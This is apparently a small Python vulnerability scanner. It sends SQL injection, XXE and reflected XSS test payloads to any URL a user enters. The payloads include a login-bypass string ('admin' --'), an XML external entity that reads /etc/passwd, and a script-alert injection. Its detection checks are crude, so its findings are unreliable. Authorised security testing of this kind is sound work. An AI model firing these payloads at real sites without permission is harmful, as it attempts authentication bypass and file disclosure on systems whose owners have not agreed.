import requests 
from bs4 import BeautifulSoup

# Function to extract and analyze forms
def analyze_forms(url):
    print(f"\n--Detection of SQL Injection Attack--")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    forms = soup.find_all('form')

    print(f"Number of forms found at {url}: {len(forms)}")

    for form in forms:
        print(f"Analyzing form at {url}...")

        # Get form action URL
        form_action = form.get('action')
        if not form_action or form_action.startswith('http'):
            continue

        # Assuming you want to analyze POST requests (you can customize this)
        if form.get('method') == 'post':
            print(f"Potential POST request form found at {url}.")

            # You can add code here to analyze input fields and construct payloads

            # Example payload for each input field (modify as needed)
            payloads = {
                'username': "admin' --",
                'password': "password",
            }

            # Send the request with the payloads
            response = requests.post(url + form_action, data=payloads)

            # Analyze the response for SQL injection indications
            if "error" in response.text.lower():
                print("Potential SQL injection vulnerability detected!")
                
def test_xxe_vulnerabilities(url, xml_payload):
    print(f"\n--Detection of XXE (XML External Entity) Attack--")
    try:
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(url, data=xml_payload, headers=headers)
        
        if "XXE detected" in response.text:
            print("XXE Vulnerability Detected!")
        else:
            print("No XXE Vulnerability Detected.")
    except Exception as e:
        print(f"Error: {e}")
        
def test_xss_vulnerabilities(url):
    print(f"\n--Detection of XSS (Cross-Site Scripting) Attack--")
    payload = "<script>alert('XSS Attack')</script>"

    # Send a GET request with the payload
    response = requests.get(url + "?parameter=" + payload)

    # Check the response for the payload
    if payload in response.text:
        print("XSS Vulnerability Detected!")
    else:
        print("No XSS Vulnerability Detected.")
        

        

if __name__ == "__main__":
    url = input("Enter the URL for vulnerability detection: ")
    xml_payload = """
    <!DOCTYPE test [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <test>&xxe;</test>
    """

    analyze_forms(url)
    test_xxe_vulnerabilities(url, xml_payload)
    test_xss_vulnerabilities(url)
